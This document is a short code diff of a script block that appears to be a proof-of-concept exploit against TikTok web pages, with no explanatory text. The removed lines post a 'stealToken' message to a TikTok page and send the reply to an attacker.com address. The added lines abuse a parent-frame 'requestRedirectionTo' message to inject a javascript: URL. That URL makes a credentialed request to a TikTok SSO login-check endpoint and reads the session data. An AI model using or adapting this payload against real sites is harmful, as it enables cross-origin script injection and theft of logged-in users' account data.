@@ -1,10 +1,6 @@
 <script>
-const win = window.open('https://www.tiktok.com/legal/report/Copyright', '_blank');
-setTimeout(() => {
-    win.postMessage('stealToken', '*');
-}, 2000);
-
-window.addEventListener('message', e => {
-    fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
-});
+parent.postMessage({
+    action: "requestRedirectionTo",
+    targetUrlStr: "javascript:var x=new XMLHttpRequest();x.open('GET','https://business-sso.tiktok.com/check_login/',!0);x.withCredentials=!0;x.onload=()=>{console.log(JSON.stringify(JSON.parse(x.responseText)))};x.send()"
+}, "*");
 </script>
